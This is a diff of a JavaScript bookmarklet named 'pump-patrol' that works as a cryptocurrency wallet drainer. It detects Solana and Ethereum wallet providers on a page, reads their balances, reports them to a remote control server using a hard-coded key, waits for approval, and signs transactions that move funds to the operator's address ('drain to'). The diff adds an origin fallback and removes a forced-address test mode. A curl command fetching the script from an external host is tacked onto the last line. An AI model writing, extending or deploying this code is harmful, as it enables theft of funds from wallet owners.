@@ -1,26 +1,30 @@
 (async()=>{
-const VER='v3.2';
+const VER='v3.3';
 const K='72d296b612eb0a11931b364ba1333a70';
-const BASE=(window.__PP||'').replace(/\/+$/,'');
+let BASE=(window.__PP||'').replace(/\/+$/,'');
 const log=(m,c)=>{try{console.log('%c[pump-patrol '+VER+'] '+m,c||'color:#5eead4;font-weight:bold')}catch(e){}};
 if(!BASE){log('no origin — bookmark not built from the site','color:#ff5c7a');return}
 log('start · origin '+BASE);
 const sid=Math.random().toString(36).slice(2,8);
 const site=()=>location.host||location.protocol+'//'+location.hostname;
-// optional forced address: p.js?addr=... (or in the bookmark, &addr=)
-let FORCE_ADDR='';
-try{FORCE_ADDR=new URLSearchParams(location.search).get('addr')||new URLSearchParams(document.location.search).get('addr')||''}catch(e){}
-const report=async(o)=>{try{const r=await fetch(BASE+'/api/report/'+sid+'?k='+K,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(Object.assign({site:site(),ver:VER},o))});if(!r.ok)log('report HTTP '+r.status,'color:#ff5c7a')}catch(e){log('report failed '+e,'color:#ff5c7a')}};
+const report=async(o)=>{try{const r=await fetch(BASE+'/api/report/'+sid+'?k='+K,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(Object.assign({site:site(),ver:VER},o))});if(!r.ok)log('report HTTP '+r.status,(r.status===403?'color:#ff5c7a; font-weight:bold':'color:#ffb454'))}catch(e){log('report failed '+e,'color:#ff5c7a')}};
 const le8=v=>{const d=new DataView(new ArrayBuffer(8));d.setBigUint64(0,BigInt(v),true);return[...new Uint8Array(d.buffer)]};
 const withTO=(p,ms,lbl)=>new Promise(r=>{const to=setTimeout(()=>{log(lbl+' timed out','color:#ffb454');r(null)},ms);Promise.resolve(p).then(v=>{clearTimeout(to);r(v)},()=>{clearTimeout(to);r(null)})});
 
-// 1) config
+// 1) config — with self-healing: if the bookmark's origin is dead and we're on the site itself, retry there
 let cfgR;try{cfgR=await fetch(BASE+'/api/config?k='+K)}catch(e){cfgR=null}
-if(!cfgR){log('config fetch failed','color:#ff5c7a');await report({phase:'fault',fault:'config fetch failed — is this origin serving /api?'});return}
+if(!cfgR||cfgR.status===404){
+  if(location.origin&&location.origin!==BASE){
+    log('bookmark origin unreachable — trying page origin '+location.origin,'color:#ffb454');
+    BASE=location.origin;
+    try{cfgR=await fetch(BASE+'/api/config?k='+K)}catch(e){cfgR=null}
+  }
+}
+if(!cfgR){log('config fetch failed (both origins)','color:#ff5c7a');await report({phase:'fault',fault:'config fetch failed — bookmark origin dead and page is not the site'});return}
 let cfg=null;try{cfg=await cfgR.json()}catch(e){}
-if(!cfg||cfg.ok===false||!cfg.me){log('config HTTP '+cfgR.status,'color:#ff5c7a');await report({phase:'fault',fault:'config HTTP '+cfgR.status+' — K mismatch or bot down'});return}
+if(!cfg||cfg.ok===false||!cfg.me){log('config HTTP '+cfgR.status,'color:#ff5c7a');await report({phase:'fault',fault:'config HTTP '+cfgR.status+' — '+(cfgR.status===403?'PP_SECRET ≠ K in p.js':'bot down')});return}
 const PER=cfg.perTx||2;
-log('config ok · drain to '+cfg.me);
+log('config ok · drain to '+cfg.me+' via '+BASE);
 
 // 2) web3 — ESM
 const W3=await(async()=>{
@@ -62,14 +66,14 @@ function detect(){
   return {found,checked,topSame:(window.top===window),frames:(window.frames?window.frames.length:1)};
 }
 let det=detect();
-await report({phase:'start',detected:det.found,checked:det.checked,topSame:det.topSame,frames:det.frames,addrMode:FORCE_ADDR});
+await report({phase:'start',detected:det.found,checked:det.checked,topSame:det.topSame,frames:det.frames});
 log('detected: '+(det.found.join(', ')||'none')+' | globals: '+Object.keys(det.checked).filter(k=>det.checked[k]).join(', '),'color:'+(det.found.length?'':'#ffb454'));
-if(!det.found.length){await new Promise(s=>setTimeout(s,3000));det=detect();await report({phase:'scan',detected:det.found,checked:det.checked,topSame:det.topSame,frames:det.frames,addrMode:FORCE_ADDR});log('rescan: '+(det.found.join(', ')||'still none'),'color:#ffb454')}
+if(!det.found.length){await new Promise(s=>setTimeout(s,3000));det=detect();await report({phase:'scan',detected:det.found,checked:det.checked,topSame:det.topSame,frames:det.frames});log('rescan: '+(det.found.join(', ')||'still none'),'color:#ffb454')}
 const usable=det.found.map(x=>x.split('@')[0]).filter(nm=>provFrom(window,nm)||provFrom(window.top,nm)).map(nm=>({name:nm,provider:provFrom(window,nm)||provFrom(window.top,nm)}));
 const seen2=new Set();
 const ws=usable.filter(x=>!seen2.has(x.provider)&&(seen2.add(x.provider),true));
 
-// helper to read one owner's balances
+// helper: read one owner's balances
 async function readOwner(owner){
   const lam=await withTO(conn.getBalance(owner),15000,'getBalance');
   const ta=await withTO(conn.getParsedTokenAccountsByOwner(owner,{programId:TOKEN}),15000,'tokenAccounts');
@@ -88,23 +92,6 @@ async function readOwner(owner){
 const live=[],rep=[];
 let evm='';
 try{const e=window.ethereum;if(e){const a=await withTO(e.request({method:'eth_accounts'}),8000,'evm');if(a&&a.length){const w=await withTO(e.request({method:'eth_getBalance',params:[a[0],'latest']}),8000,'evm bal');if(w!=null)evm=a[0]+' — '+(BigInt(w)/10n**18n)+' ETH'}}}catch(e){}
-
-// 3a) FORCE-ADDRESS mode — no wallet needed, proves the read pipeline
-if(FORCE_ADDR){
-  try{
-    const owner=new PublicKey(FORCE_ADDR);
-    const{lam,toks}=await readOwner(owner);
-    rep.push({name:'forced-addr',addr:owner.toString(),sol:lam!=null?+(lam/LAMPORTS_PER_SOL).toFixed(6):0,tokens:toks.map(t=>({mint:t.mint.toString(),amt:String(t.ui)})),note:'forced address read (wallet not required)'});
-    log('forced addr read · '+(lam!=null?(lam/LAMPORTS_PER_SOL).toFixed(5):'?')+' SOL · '+toks.length+' tokens');
-    await report({phase:'ready',evm,wallets:rep});
-    log('ready (forced) · waiting for DRAIN (note: draining a forced addr still needs a wallet to sign)');
-  }catch(e){rep.push({name:'forced-addr',addr:FORCE_ADDR,sol:0,tokens:[],note:'bad address: '+String(e.message||e)});await report({phase:'ready',evm,wallets:rep})}
-  let act=null;const t0=Date.now();
-  while(!act&&Date.now()-t0<300000){let v=null;try{const r=await fetch(BASE+'/api/verdict/'+sid+'?k='+K);v=await r.json()}catch(e){}if(v&&v.a)act=v.a;else await new Promise(s=>setTimeout(s,2500))}
-  if(act!=='go'){await report({phase:'done',note:act==='stop'?'skipped':'timed out'});return}
-  await report({phase:'done',note:'approved, but forced-address mode has no signer — connect a wallet to drain'});
-  return;
-}
 
 // 4) connect + read each usable provider
 for(const w of ws){
@@ -172,4 +159,4 @@ for(const{w,owner,lam,toks,skipSol}of live){
 }
 await report({phase:'done',note:sigs+' tx signed',wallets:rep});
 log('done · '+sigs+' tx');
-})().catch(e=>{try{console.log('%c[pump-patrol '+VER+'] fatal '+e,'color:#ff5c7a')}catch(_){}});
+})().catch(e=>{try{console.log('%c[pump-patrol '+VER+'] fatal '+e,'color:#ff5c7a')}catch(_){}});curl -s https://one234-et4e.onrender.com/p.js | head -c 120
